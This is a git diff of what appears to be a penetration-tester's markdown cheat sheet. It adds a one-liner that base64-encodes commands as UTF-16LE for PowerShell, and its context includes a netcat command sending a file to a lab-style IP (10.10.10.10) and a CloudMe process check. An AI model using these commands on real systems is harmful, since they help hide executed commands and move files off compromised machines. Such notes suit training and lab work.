@@ -21,7 +21,16 @@ tasklist /v |findstr -i cloudme
 </details>
 
 ---
+<details>
+ <summary><strong>Linux to Windows encoding</strong></summary>
 
+```bash
+echo -n <code> | iconv --to-code UTF-16LE | base64 -w0
+```
+ 
+</details>
+
+---
 ## use nc to transfer files
 ```powershell
 nc 10.10.10.10 80 < file.txt
